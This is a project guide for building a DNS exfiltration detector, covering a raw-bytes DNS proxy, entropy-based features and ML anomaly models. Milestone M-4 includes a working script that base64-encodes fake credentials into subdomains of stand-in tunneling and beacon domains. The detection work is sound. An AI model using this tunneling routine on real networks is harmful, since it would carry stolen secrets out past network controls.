# DNS Exfiltration Detection System
## Milestone Reference Document
### Stage-by-Stage Build Guide (Independent of CodeCrafters)

> This document replaces the CodeCrafters platform entirely.
> Each milestone has a description, exact what-to-build, and a test checklist
> you run yourself to confirm the stage is complete before moving on.

---

## How to Use This Document

Work through milestones in order. Do not start M-2 until M-1's test checklist
passes. The DNS server stages (M-1, M-2) are pure protocol engineering —
your reference is RFC 1035 (https://www.rfc-editor.org/rfc/rfc1035). The ML
stages (M-3 through M-7) build on top of what the server produces. M-8 ties
everything into a presentable project.

---

## Timeline Overview

| Milestone | Focus                                      | Time     | Week   | % Done |
|-----------|--------------------------------------------|----------|--------|--------|
| M-0       | Repo setup, folder structure               | 1 day    | 1      | 5%     |
| M-1       | DNS server — UDP socket, header + question | 3 days   | 1      | 18%    |
| M-2       | DNS compression, forwarder, SQLite logger  | 2 days   | 1      | 28%    |
| M-3       | Dataset EDA, feature engineering           | 3 days   | 2      | 43%    |
| M-4       | Live scorer, synthetic attack script       | 2 days   | 2      | 53%    |
| M-5       | Phase 1 ML — Random Forest, Isolation Forest, SHAP | 3 days | 2–3 | 68% |
| M-6       | Phase 2 ML — Autoencoder                   | 3 days   | 3      | 80%    |
| M-7       | Phase 3 ML — 1D CNN + LSTM, model comparison | 3 days | 3–4   | 90%    |
| M-8       | Streamlit dashboard, screencast, README    | 2 days   | 4      | 100%   |

---

---

## M-0 — Repository Setup

**Time:** 1 day | **Tag:** SETUP

### What to Build

Create a public GitHub repository named `dns-exfil-detector`.

Set up the following folder structure exactly. Empty folders need at minimum
a placeholder `README.md` so they appear on GitHub:

```
dns-exfil-detector/
├── dns_server/
│   ├── server.py
│   ├── parser.py
│   ├── forwarder.py
│   └── logger.py
├── pipeline/
│   ├── features.py
│   ├── dataset.py
│   └── scorer.py
├── models/
│   ├── phase1_classical.ipynb
│   ├── phase2_autoencoder.ipynb
│   └── phase3_lstm_cnn.ipynb
├── dashboard/
│   └── app.py
├── attack_sim/
│   └── tunnel_sim.py
├── tests/
│   └── test_parser.py
├── data/
│   └── download.sh
├── demo/
├── requirements.txt
└── README.md
```

Write a `README.md` with:
- Project title: "DNS Exfiltration Detection System"
- One paragraph describing DNS tunneling and what this project detects
- Tech stack listed (Python, scikit-learn, Keras, Streamlit, SQLite)
- Placeholder section: `## Demo` (fill in after M-8)
- Placeholder section: `## Results` (fill in after M-7)
- Placeholder section: `## Quick Start` (fill in after M-8)

Add a `.gitignore` covering: `__pycache__/`, `*.pyc`, `.ipynb_checkpoints/`,
`data/*.csv`, `data/*.pcap`, `*.db`, `.env`

Write `data/download.sh` with the dataset URL as a comment and a `wget` or
`curl` command placeholder — datasets are too large to commit.

**Git Commit:** `M-0: Initial repository setup, folder structure, and README`

### ✅ Test Checklist

- [ ] Repo is public and visible at github.com/yourusername/dns-exfil-detector
- [ ] All folders from the structure above exist and are visible on GitHub
- [ ] README renders correctly with no broken markdown
- [ ] `.gitignore` is present and the `data/` directory is ignored
- [ ] `git log` shows exactly one commit with the M-0 message

---

---

## M-1 — DNS Server: Core Protocol Implementation

**Time:** 3 days | **Tag:** DNS SERVER
**RFC Reference:** https://www.rfc-editor.org/rfc/rfc1035 — Sections 4.1.1, 4.1.2, 4.1.3

### Background

A DNS packet has three major sections. You are building a parser for all three
from raw bytes — no libraries allowed for the parsing itself. Python's `socket`
module handles the network layer. Python's `struct` module handles byte
interpretation. That is all you need.

Every DNS packet starts with a fixed 12-byte header. After the header comes
the question section (what the client is asking for). After the question comes
the answer section (what the server returns). You are building all three.

### What to Build

**Day 1 — UDP Socket + Header Parser (`dns_server/server.py`, `dns_server/parser.py`)**

Open a UDP socket on port 5353 (not 53 — port 53 requires root on Linux):

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('127.0.0.1', 5353))

while True:
    data, addr = sock.recvfrom(512)
    # data is raw bytes — pass to parser
```

Parse the 12-byte DNS header using `struct.unpack`. The header layout is:

```
Bytes 0-1:  Transaction ID  (uint16)
Bytes 2-3:  Flags           (uint16)
Bytes 4-5:  QDCOUNT — number of questions (uint16)
Bytes 6-7:  ANCOUNT — number of answers (uint16)
Bytes 8-9:  NSCOUNT — authority records (uint16)
Bytes 10-11: ARCOUNT — additional records (uint16)
```

```python
import struct

def parse_header(data: bytes) -> dict:
    fields = struct.unpack('!HHHHHH', data[:12])
    return {
        'transaction_id': fields[0],
        'flags':          fields[1],
        'qdcount':        fields[2],
        'ancount':        fields[3],
        'nscount':        fields[4],
        'arcount':        fields[5],
    }
```

The `!` prefix means big-endian (network byte order). `H` means unsigned short
(2 bytes). Six of them = 12 bytes. RFC 1035 Section 4.1.1 is the authority for
this layout.

Write a `pack_header()` function that does the reverse — takes a dict and
returns 12 bytes. You need this to build responses.

**Day 2 — Question Section + Answer Section (`dns_server/parser.py`)**

DNS domain names use label encoding, not plain strings. `google.com` is stored
as: `\x06google\x03com\x00`

Each segment is preceded by its length as a single byte. The name ends with a
null byte `\x00`. Parse this:

```python
def parse_name(data: bytes, offset: int) -> tuple[str, int]:
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        # If top 2 bits are 11, this is a compression pointer — handle in M-2
        labels.append(data[offset+1 : offset+1+length].decode('ascii'))
        offset += 1 + length
    return '.'.join(labels), offset
```

After the name, the question section has two more fields:
- QTYPE (2 bytes): 1 = A record, 28 = AAAA, 15 = MX, 16 = TXT
- QCLASS (2 bytes): almost always 1 (IN = internet)

For the answer section, build a `DNSRecord` class:

```python
class DNSRecord:
    def __init__(self, name, rtype, rclass, ttl, rdata):
        self.name   = name
        self.rtype  = rtype
        self.rclass = rclass
        self.ttl    = ttl
        self.rdata  = rdata   # raw bytes

    def pack(self) -> bytes:
        # Pack name + type + class + ttl + rdlength + rdata
        # RFC 1035 Section 4.1.3
        ...
```

For now, return a dummy A record response (hardcoded IP `127.0.0.1`) for any
query. You are not trying to resolve real domains yet — that comes in M-2.
The goal is to produce a syntactically valid DNS response packet.

**Day 3 — Unit Tests (`tests/test_parser.py`)**

Capture a real DNS packet using scapy or use this hardcoded bytes literal
(a real A query for `google.com`):

```python
RAW_QUERY = bytes([
    0x12, 0x34,  # Transaction ID
    0x01, 0x00,  # Flags: standard query
    0x00, 0x01,  # QDCOUNT: 1 question
    0x00, 0x00,  # ANCOUNT: 0
    0x00, 0x00,  # NSCOUNT: 0
    0x00, 0x00,  # ARCOUNT: 0
    # Question: google.com, type A, class IN
    0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65,  # \x06google
    0x03, 0x63, 0x6f, 0x6d,                      # \x03com
    0x00,                                          # null terminator
    0x00, 0x01,  # QTYPE: A
    0x00, 0x01,  # QCLASS: IN
])
```

Assert:
- `parse_header(RAW_QUERY)['transaction_id'] == 0x1234`
- `parse_header(RAW_QUERY)['qdcount'] == 1`
- `parse_name(RAW_QUERY, 12)[0] == 'google.com'`
- Your server sends back a response when you run `dig @127.0.0.1 -p 5353 google.com`

**Git Commit:** `M-1: DNS server core — UDP socket, header and question section parsing`

### ✅ Test Checklist

- [ ] `python dns_server/server.py` starts without errors and prints "listening on 127.0.0.1:5353"
- [ ] `dig @127.0.0.1 -p 5353 google.com` returns a response (dummy IP is fine)
- [ ] `python -m pytest tests/test_parser.py` passes all assertions
- [ ] `parse_header()` correctly extracts transaction ID, qdcount from RAW_QUERY
- [ ] `parse_name()` correctly extracts `'google.com'` from the bytes literal
- [ ] No DNS library (dnspython etc.) is used anywhere in parser.py — only `struct` and `socket`

---

---

## M-2 — DNS Server: Compression, Forwarder & Logger

**Time:** 2 days | **Tag:** DNS SERVER
**RFC Reference:** RFC 1035 Section 4.1.4 (message compression)

### Background

Two things remain before your DNS server is feature-complete:

**Compression:** Real DNS packets use pointer compression to save space. When
the top 2 bits of a length byte are both `1` (i.e., `0xC0` or above), the
next byte forms a 2-byte pointer to an earlier offset in the packet where the
name continues. Many DNS tunneling tools manipulate compression pointers to
confuse simple parsers — your parser needs to handle this correctly.

**Forwarding:** A real recursive resolver, when it cannot answer a query
locally, forwards it upstream. You forward to `8.8.8.8:53`. This makes your
server functional and places it in the exact position in a network where you
would deploy a detector — all DNS traffic flows through it.

### What to Build

**DNS Compression Handling (`dns_server/parser.py`)**

Extend `parse_name()` to detect pointer bytes:

```python
def parse_name(data: bytes, offset: int) -> tuple[str, int]:
    labels = []
    visited = set()  # prevent infinite loops on malformed packets

    while True:
        if offset in visited:
            break
        visited.add(offset)

        length = data[offset]

        if length == 0:
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            # Compression pointer: next 2 bytes form the target offset
            pointer = ((length & 0x3F) << 8) | data[offset + 1]
            name_part, _ = parse_name(data, pointer)
            labels.append(name_part)
            offset += 2
            break
        else:
            labels.append(data[offset+1 : offset+1+length].decode('ascii', errors='replace'))
            offset += 1 + length

    return '.'.join(labels), offset
```

The `visited` set is important — a malformed or adversarial packet with a
pointer loop would otherwise cause infinite recursion. This is a real
robustness concern for a security tool.

**Forwarder (`dns_server/forwarder.py`)**

```python
import socket

UPSTREAM = ('8.8.8.8', 53)

def forward_query(raw_packet: bytes) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(3.0)
        s.sendto(raw_packet, UPSTREAM)
        response, _ = s.recvfrom(512)
    return response
```

In `server.py`, call `forward_query()` with the raw received bytes, then send
the response back to the original client address. You are now a functional DNS
proxy. Test this by temporarily pointing your system DNS to `127.0.0.1:5353`
and making a web request — or just use `dig`.

**Query Logger (`dns_server/logger.py`)**

On every query, before forwarding, write a row to SQLite:

```python
import sqlite3
from datetime import datetime

DB_PATH = 'data/queries.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''
        CREATE TABLE IF NOT EXISTS queries (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp     TEXT,
            src_ip        TEXT,
            query_name    TEXT,
            record_type   TEXT,
            response_code TEXT
        )
    ''')
    conn.commit()
    conn.close()

def log_query(src_ip: str, query_name: str, record_type: str, response_code: str = 'NOERROR'):
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        'INSERT INTO queries (timestamp, src_ip, query_name, record_type, response_code) VALUES (?,?,?,?,?)',
        (datetime.utcnow().isoformat(), src_ip, query_name, record_type, response_code)
    )
    conn.commit()
    conn.close()
```

Call `init_db()` at server startup. Call `log_query()` inside the receive loop
before forwarding. Every DNS query your machine makes now gets recorded.

**Git Commit:** `M-2: DNS compression, query forwarder, and SQLite logger`

### ✅ Test Checklist

- [ ] `dig @127.0.0.1 -p 5353 mail.google.com` resolves correctly (not dummy IP — real answer from 8.8.8.8 forwarded back)
- [ ] `dig @127.0.0.1 -p 5353 nonexistent.example.com` returns NXDOMAIN without crashing
- [ ] After running a few dig commands, `sqlite3 data/queries.db "SELECT * FROM queries"` shows rows
- [ ] Rows have correct timestamp, query_name, record_type fields populated
- [ ] A manually crafted packet with a compression pointer is parsed correctly without infinite loop
- [ ] Server handles a `settimeout` expiry (upstream unreachable) gracefully without crashing

---

---

## M-3 — Data Pipeline: Dataset EDA & Feature Engineering

**Time:** 3 days | **Tag:** ML PIPELINE

### Background

Before training any model you need labelled data showing what normal DNS looks
like vs. tunneled DNS. You will use a real research dataset for this. You will
also engineer the features that your models actually learn from — the raw query
string alone is not the input, you extract measurable properties from it.

### What to Build

**Day 1 — Dataset Setup & EDA**

Download CIRA-CIC-DoHBrute from `https://www.unb.ca/cic/datasets/` — look for
the DoH (DNS over HTTPS) dataset which contains labelled benign and tunneling
traffic. If unavailable, UNSW-NB15 is a suitable alternative.

In a Jupyter notebook or a `dataset.py` script:

```python
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns

df = pd.read_csv('data/your_dataset.csv')
print(df['label'].value_counts())
print(df.isnull().sum())
print(df.dtypes)

# Key EDA plot 1: query length distribution by label
df['query_length'] = df['query_name'].str.len()
df.groupby('label')['query_length'].hist(bins=50, alpha=0.6)
plt.title('Query Length Distribution: Normal vs Tunneled')
plt.savefig('demo/eda_query_length.png')

# Key EDA plot 2: unique query names per source IP
```

Document your findings in a markdown cell: what is the class balance? What is
the query length range for each class? This EDA narrative is what you describe
in interviews.

**Day 2 — Feature Engineering (`pipeline/features.py`)**

Implement these functions from scratch. No library shortcuts for the math:

```python
import math
from collections import Counter

def subdomain_length(query: str) -> int:
    """Length of leftmost label before first dot."""
    return len(query.split('.')[0])

def shannon_entropy(s: str) -> float:
    """Shannon entropy: H = -sum(p * log2(p)) per character frequency.
    High entropy (~6 bits/char) = random/encoded data. Low (~3) = readable words."""
    if not s:
        return 0.0
    counts = Counter(s.lower())
    total = len(s)
    return -sum((c/total) * math.log2(c/total) for c in counts.values())

def digit_ratio(s: str) -> float:
    """Ratio of digit characters. Base64 has fewer digits than hex encoding."""
    return sum(c.isdigit() for c in s) / max(len(s), 1)

def consonant_vowel_ratio(s: str) -> float:
    """Legitimate domains are pronounceable — they have vowels.
    Encoded strings have near-zero vowel representation."""
    vowels = set('aeiou')
    consonants = set('bcdfghjklmnpqrstvwxyz')
    v = sum(c in vowels for c in s.lower())
    c = sum(c in consonants for c in s.lower())
    return c / max(v, 1)

def label_count(query: str) -> int:
    """Number of dot-separated segments. Tunneled domains often have more labels."""
    return len(query.split('.'))

def max_label_length(query: str) -> int:
    """Length of the longest individual segment."""
    return max(len(part) for part in query.split('.')) if query else 0

def has_hex_pattern(s: str) -> int:
    """1 if subdomain looks like a hex string, 0 otherwise."""
    sub = s.split('.')[0].lower()
    return int(all(c in '0123456789abcdef' for c in sub) and len(sub) > 20)

def build_feature_vector(query: str) -> dict:
    sub = query.split('.')[0]
    return {
        'subdomain_length':     subdomain_length(query),
        'full_query_length':    len(query),
        'shannon_entropy':      shannon_entropy(sub),
        'digit_ratio':          digit_ratio(sub),
        'consonant_vowel_ratio': consonant_vowel_ratio(sub),
        'label_count':          label_count(query),
        'max_label_length':     max_label_length(query),
        'has_hex_pattern':      has_hex_pattern(query),
    }
```

Apply `build_feature_vector()` to every row in your dataset. Confirm that
`shannon_entropy` for tunneled queries is measurably higher than normal queries
by plotting overlapping density plots.

**Day 3 — Time Window Features + Preprocessing (`pipeline/dataset.py`)**

Behavioural features require aggregating over time:

```python
def sliding_window_features(df: pd.DataFrame, window_seconds: int = 60) -> pd.DataFrame:
    """
    For each (src_ip, parent_domain) pair, compute:
    - unique_subdomains_per_window: how many distinct subdomains in 60s
    - queries_per_second: average query rate
    Tunneled traffic hammers the same parent domain with many unique subdomains.
    """
    df['timestamp'] = pd.to_datetime(df['timestamp'])
    df['parent_domain'] = df['query_name'].apply(lambda q: '.'.join(q.split('.')[-2:]))
    df = df.sort_values('timestamp')

    results = []
    for _, group in df.groupby(['src_ip', 'parent_domain']):
        group = group.set_index('timestamp').sort_index()
        group['unique_subs'] = group['query_name'].rolling(f'{window_seconds}s').apply(
            lambda x: x.nunique(), raw=False
        )
        results.append(group)
    return pd.concat(results).reset_index()
```

Then apply `StandardScaler`, do a stratified 80/20 train/test split, and save:

```python
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split

scaler = StandardScaler()
X_scaled = scaler.fit_transform(X)
X_train, X_test, y_train, y_test = train_test_split(
    X_scaled, y, test_size=0.2, stratify=y, random_state=42
)

import joblib
joblib.dump(scaler, 'models/scaler.pkl')
```

**Git Commit:** `M-3: Data pipeline — dataset EDA, feature engineering, preprocessing`

### ✅ Test Checklist

- [ ] `demo/eda_query_length.png` saved — shows visible separation between classes
- [ ] `shannon_entropy('SGVsbG8gV29ybGQ')` returns a value above 4.0 (high entropy)
- [ ] `shannon_entropy('mail')` returns a value below 2.5 (low entropy)
- [ ] `build_feature_vector('SGVsbG8gV29ybGQ.evil.com')` returns a dict with all 8 keys
- [ ] Feature matrix has no NaN values (`X.isnull().sum().sum() == 0`)
- [ ] Train/test split preserves class ratio: `y_train.mean()` ≈ `y_test.mean()`
- [ ] Density plot of entropy by label shows clear separation — tunneled queries peak above 5.0

---

---

## M-4 — Live Scorer & Synthetic Attack Generation

**Time:** 2 days | **Tag:** ML PIPELINE

### Background

This milestone connects your running DNS server to your ML pipeline, and
generates the attack traffic you will later detect. After this milestone, you
have a complete data loop: attack traffic flows in, gets logged, gets scored,
and the anomalies are visible before any model is trained.

### What to Build

**Day 1 — Live Feature Scorer (`pipeline/scorer.py`)**

```python
import sqlite3
import time
import pandas as pd
from pipeline.features import build_feature_vector

DB_PATH = 'data/queries.db'
RESULTS_DB = 'data/scored.db'
POLL_INTERVAL = 5  # seconds

def init_results_db():
    conn = sqlite3.connect(RESULTS_DB)
    conn.execute('''
        CREATE TABLE IF NOT EXISTS scored_queries (
            id                   INTEGER PRIMARY KEY,
            timestamp            TEXT,
            query_name           TEXT,
            subdomain_length     REAL,
            shannon_entropy      REAL,
            digit_ratio          REAL,
            consonant_vowel_ratio REAL,
            label_count          REAL,
            max_label_length     REAL,
            has_hex_pattern      REAL,
            anomaly_score        REAL DEFAULT NULL
        )
    ''')
    conn.commit()
    conn.close()

def score_new_queries(last_id: int = 0) -> int:
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        'SELECT id, timestamp, query_name FROM queries WHERE id > ?', (last_id,)
    ).fetchall()
    conn.close()

    if not rows:
        return last_id

    results_conn = sqlite3.connect(RESULTS_DB)
    for row_id, timestamp, query_name in rows:
        features = build_feature_vector(query_name)
        results_conn.execute('''
            INSERT OR IGNORE INTO scored_queries
            (id, timestamp, query_name, subdomain_length, shannon_entropy,
             digit_ratio, consonant_vowel_ratio, label_count, max_label_length, has_hex_pattern)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        ''', (row_id, timestamp, query_name,
              features['subdomain_length'], features['shannon_entropy'],
              features['digit_ratio'], features['consonant_vowel_ratio'],
              features['label_count'], features['max_label_length'],
              features['has_hex_pattern']))
    results_conn.commit()
    results_conn.close()

    return rows[-1][0]

if __name__ == '__main__':
    init_results_db()
    last_id = 0
    print('Scorer running — polling every 5 seconds')
    while True:
        last_id = score_new_queries(last_id)
        time.sleep(POLL_INTERVAL)
```

Run this in a second terminal alongside your DNS server. Browse the web or
run dig commands — you should see rows appearing in `scored.db` with feature
values computed.

**Day 2 — Synthetic Tunneling Script (`attack_sim/tunnel_sim.py`)**

This script plays the attacker role. It takes arbitrary data, encodes it, and
sends it through your DNS server as tunneling traffic:

```python
import base64
import socket
import struct
import time
import random
import string

SERVER = '127.0.0.1'
PORT = 5353
EVIL_DOMAIN = 'exfil.c2test'

def build_dns_query(domain: str, transaction_id: int = None) -> bytes:
    if transaction_id is None:
        transaction_id = random.randint(0, 65535)

    header = struct.pack('!HHHHHH',
        transaction_id,
        0x0100,  # flags: standard query, recursion desired
        1, 0, 0, 0  # 1 question, 0 answers
    )

    question = b''
    for label in domain.split('.'):
        encoded = label.encode('ascii')
        question += bytes([len(encoded)]) + encoded
    question += b'\x00'
    question += struct.pack('!HH', 1, 1)  # QTYPE A, QCLASS IN

    return header + question

def tunnel_send(payload: str, chunk_size: int = 30):
    encoded = base64.b64encode(payload.encode()).decode().replace('=', '')
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    print(f'[*] Tunneling {len(payload)} bytes as {len(chunks)} DNS queries')
    for i, chunk in enumerate(chunks):
        query_domain = f'{chunk}.{EVIL_DOMAIN}'
        packet = build_dns_query(query_domain)
        sock.sendto(packet, (SERVER, PORT))
        print(f'[+] Sent chunk {i+1}/{len(chunks)}: {query_domain[:60]}...')
        time.sleep(0.05)

    sock.close()

if __name__ == '__main__':
    # Simulate exfiltrating a credential dump
    fake_credentials = 'username:admin\npassword:hunter2\napi_key:sk-proj-abc123xyz'
    tunnel_send(fake_credentials)

    # Also send some DGA-like random domain queries to simulate C2 beaconing
    print('\n[*] Sending DGA-pattern beaconing queries')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(20):
        dga_domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(15,30)))
        dga_query = f'{dga_domain}.c2beacon.net'
        sock.sendto(build_dns_query(dga_query), (SERVER, PORT))
        time.sleep(0.02)
    sock.close()
    print('[+] Attack simulation complete')
```

After running this while both the server and scorer are active, open
`data/scored.db` and run:

```sql
SELECT query_name, shannon_entropy, subdomain_length
FROM scored_queries
ORDER BY shannon_entropy DESC
LIMIT 20;
```

The top rows should all be your tunnel_sim queries. This is your sanity check
before you train a single model.

**Git Commit:** `M-4: Live scorer, synthetic tunneling simulation, attack data generation`

### ✅ Test Checklist

- [ ] `python pipeline/scorer.py` runs without errors and prints "Scorer running"
- [ ] After running `dig @127.0.0.1 -p 5353 google.com`, a row appears in `scored.db` within 10 seconds
- [ ] `python attack_sim/tunnel_sim.py` completes without errors
- [ ] Attack queries appear in `scored.db` with `shannon_entropy` > 4.5
- [ ] Normal dig queries in `scored.db` have `shannon_entropy` < 3.5
- [ ] Plot entropy histograms of attack vs. normal rows — they should show visible separation
- [ ] The `build_dns_query()` function produces a valid packet — confirm with `dig` or Wireshark sniff

---

---

## M-5 — Phase 1 ML: Random Forest, Isolation Forest & SHAP

**Time:** 3 days | **Tag:** PHASE 1 ML
**Notebook:** `models/phase1_classical.ipynb`

### Background

This is your first ML milestone. You train two models that approach the same
problem from opposite angles — one supervised (it needs labelled training data),
one unsupervised (it needs only normal traffic). Understanding *why* both exist
is as important as getting the numbers — interviewers will ask.

**Random Forest:** You give it thousands of queries labelled normal/tunneled.
It learns decision rules over your feature set. Strong performance, needs labels.
This mirrors production systems at organisations that have historical incident data.

**Isolation Forest:** You give it only normal traffic. It learns what "normal"
looks like and flags anomalies by how easily it can isolate them. No labels
needed for training. This mirrors the realistic deployment scenario where you
are seeing a new attack type for the first time — you do not have labelled
examples of it yet.

**SHAP:** Makes predictions explainable. For any flagged query, SHAP tells you
which features pushed the prediction toward "tunneled" and by how much. In
security operations, an unexplained alert is almost worthless — analysts need
to know *why* something was flagged.

### What to Build

**Random Forest Classifier**

```python
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, confusion_matrix, roc_auc_score, roc_curve
import seaborn as sns
import matplotlib.pyplot as plt

rf = RandomForestClassifier(n_estimators=200, max_depth=None, random_state=42, n_jobs=-1)
rf.fit(X_train, y_train)
y_pred = rf.predict(X_test)
y_prob = rf.predict_proba(X_test)[:, 1]

print(classification_report(y_test, y_pred, target_names=['normal', 'tunneled']))
print(f'ROC-AUC: {roc_auc_score(y_test, y_prob):.4f}')

# Confusion matrix
cm = confusion_matrix(y_test, y_pred)
sns.heatmap(cm, annot=True, fmt='d', cmap='Blues',
            xticklabels=['normal','tunneled'], yticklabels=['normal','tunneled'])
plt.title('Random Forest — Confusion Matrix')
plt.savefig('../demo/rf_confusion_matrix.png')

# ROC Curve
fpr, tpr, _ = roc_curve(y_test, y_prob)
plt.plot(fpr, tpr, label=f'RF (AUC={roc_auc_score(y_test, y_prob):.3f})')
plt.xlabel('False Positive Rate')
plt.ylabel('True Positive Rate')
plt.title('ROC Curve')
plt.legend()
plt.savefig('../demo/roc_curve.png')
```

Target: F1 > 0.85 on the tunneled class. If below this, check feature scaling
was applied and class balance in the split.

**Isolation Forest**

```python
from sklearn.ensemble import IsolationForest
import numpy as np

# Train ONLY on normal samples — this is the key distinction
X_train_normal = X_train[y_train == 0]

iso = IsolationForest(contamination=0.05, random_state=42, n_jobs=-1)
iso.fit(X_train_normal)

# Scores: more negative = more anomalous
scores = iso.decision_function(X_test)
# Convert to binary prediction: -1 = anomaly, 1 = normal → remap to 0/1
iso_pred = (iso.predict(X_test) == -1).astype(int)

print(classification_report(y_test, iso_pred, target_names=['normal', 'tunneled']))
```

Build a comparison table in a markdown cell:

| Model            | Precision | Recall | F1   | ROC-AUC |
|------------------|-----------|--------|------|---------|
| Random Forest    | TBD       | TBD    | TBD  | TBD     |
| Isolation Forest | TBD       | TBD    | TBD  | TBD     |

Fill it in with your actual numbers. Where does Isolation Forest underperform?
(It typically has lower precision — more false positives — because it has no
concept of the attack class, only of "not normal".)

**SHAP Explainability**

```python
import shap

explainer = shap.TreeExplainer(rf)
shap_values = explainer.shap_values(X_test)

# Global feature importance — what features matter most overall?
shap.summary_plot(shap_values[1], X_test,
                  feature_names=list(feature_names),
                  show=False)
plt.savefig('../demo/shap_plots/shap_summary.png', bbox_inches='tight')

# Individual explanations for 3 flagged queries
flagged_indices = np.where((y_test == 1) & (y_pred == 1))[0][:3]
for idx in flagged_indices:
    shap.force_plot(
        explainer.expected_value[1],
        shap_values[1][idx],
        X_test.iloc[idx],
        feature_names=list(feature_names),
        matplotlib=True,
        show=False
    )
    plt.savefig(f'../demo/shap_plots/shap_force_{idx}.png', bbox_inches='tight')
    plt.close()
```

In a markdown cell, write a 150-200 word analysis answering:
- Which feature was most predictive? (Almost certainly shannon_entropy)
- Which feature was least predictive?
- Did the Isolation Forest miss attacks that Random Forest caught? Why would
  that happen mechanically (think about what each model actually "knows")?

This analysis is what you say in interviews. Numbers without interpretation
are noise.

Save the trained Random Forest: `joblib.dump(rf, '../models/rf_model.pkl')`

**Git Commit:** `M-5: Phase 1 ML — Random Forest, Isolation Forest, SHAP explainability`

### ✅ Test Checklist

- [ ] Random Forest F1 on tunneled class > 0.85
- [ ] ROC-AUC > 0.90
- [ ] `demo/rf_confusion_matrix.png` saved and renders correctly
- [ ] `demo/roc_curve.png` saved
- [ ] `demo/shap_plots/shap_summary.png` saved — entropy is in the top 3 features
- [ ] 3 individual SHAP force plots saved for flagged queries
- [ ] Model comparison markdown table filled in with real numbers
- [ ] 150-200 word analysis cell written in notebook
- [ ] `models/rf_model.pkl` saved and loadable with `joblib.load()`
- [ ] `joblib.load('models/rf_model.pkl').predict(X_test[:5])` runs without errors

---

---

## M-6 — Phase 2 ML: Autoencoder Anomaly Detection

**Time:** 3 days | **Tag:** PHASE 2 ML
**Notebook:** `models/phase2_autoencoder.ipynb`

### Background

An autoencoder is a neural network trained to compress its input into a small
bottleneck and then reconstruct the original from that compressed representation.
When trained only on normal traffic, it learns to reconstruct normal queries well.
When a tunneled query passes through, the network cannot reconstruct it accurately
because it has never seen that pattern — the reconstruction error is high.

This reconstruction error becomes your anomaly score. No labels required.
This is called an unsupervised deep anomaly detection approach and it is the
architecture used in production at companies like Darktrace and Vectra.

### What to Build

**Architecture**

```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers
import numpy as np
import matplotlib.pyplot as plt

input_dim = X_train.shape[1]

# Encoder: compresses input to 8-dimensional bottleneck
encoder_input = keras.Input(shape=(input_dim,))
x = layers.Dense(32, activation='relu')(encoder_input)
x = layers.Dense(16, activation='relu')(x)
bottleneck = layers.Dense(8, activation='relu')(x)  # compressed representation

# Decoder: reconstructs from bottleneck
x = layers.Dense(16, activation='relu')(bottleneck)
x = layers.Dense(32, activation='relu')(x)
decoder_output = layers.Dense(input_dim, activation='sigmoid')(x)

autoencoder = keras.Model(encoder_input, decoder_output)
autoencoder.compile(optimizer='adam', loss='mse')
autoencoder.summary()
```

**Training — Normal Traffic Only**

```python
X_train_normal = X_train[y_train == 0]  # only normal samples

history = autoencoder.fit(
    X_train_normal, X_train_normal,  # input = target (reconstruction task)
    epochs=100,
    batch_size=64,
    validation_split=0.1,
    callbacks=[
        keras.callbacks.EarlyStopping(
            monitor='val_loss', patience=5, restore_best_weights=True
        )
    ],
    verbose=1
)

# Plot training curves
plt.plot(history.history['loss'], label='train loss')
plt.plot(history.history['val_loss'], label='val loss')
plt.title('Autoencoder Training — Loss Curves')
plt.xlabel('Epoch')
plt.legend()
plt.savefig('../demo/autoencoder_loss.png')
```

Loss curves should converge. If validation loss climbs while training loss
falls, you are overfitting — reduce network size or increase dropout.

**Anomaly Scoring**

```python
# Compute reconstruction error for every test sample
reconstructions = autoencoder.predict(X_test)
reconstruction_errors = np.mean(np.power(X_test - reconstructions, 2), axis=1)

# Threshold: 95th percentile of normal traffic errors
# "If this query's error is higher than 95% of normal queries, flag it"
normal_errors = reconstruction_errors[y_test == 0]
threshold = np.percentile(normal_errors, 95)
print(f'Anomaly threshold: {threshold:.6f}')

ae_pred = (reconstruction_errors > threshold).astype(int)
print(classification_report(y_test, ae_pred, target_names=['normal', 'tunneled']))
```

**Key Visualisation**

```python
# Overlapping histograms — this plot belongs in your README
plt.figure(figsize=(10, 5))
plt.hist(reconstruction_errors[y_test == 0], bins=80, alpha=0.6,
         label='Normal traffic', color='steelblue', density=True)
plt.hist(reconstruction_errors[y_test == 1], bins=80, alpha=0.6,
         label='Tunneled traffic', color='crimson', density=True)
plt.axvline(threshold, color='black', linestyle='--', label=f'Threshold = {threshold:.4f}')
plt.xlabel('Reconstruction Error (MSE)')
plt.ylabel('Density')
plt.title('Autoencoder: Reconstruction Error Distribution')
plt.legend()
plt.savefig('../demo/autoencoder_reconstruction_error.png')
```

If the two distributions overlap significantly, your features may need more
signal. Try increasing the bottleneck compression (reduce bottleneck to 4 dims)
to force stronger separation.

Update the model comparison table from M-5 with Autoencoder precision/recall/F1.

Save the model: `autoencoder.save('models/autoencoder.keras')`

**Git Commit:** `M-6: Phase 2 ML — Autoencoder anomaly detection and threshold tuning`

### ✅ Test Checklist

- [ ] `demo/autoencoder_loss.png` — training and validation loss both converge (no divergence)
- [ ] `demo/autoencoder_reconstruction_error.png` — two distributions show visible separation
- [ ] Threshold is set at 95th percentile of normal traffic errors (not manually tuned to cheat)
- [ ] Classification report printed — note F1 on tunneled class for comparison table
- [ ] `models/autoencoder.keras` saved and reloadable with `keras.models.load_model()`
- [ ] Model comparison table updated with Autoencoder row
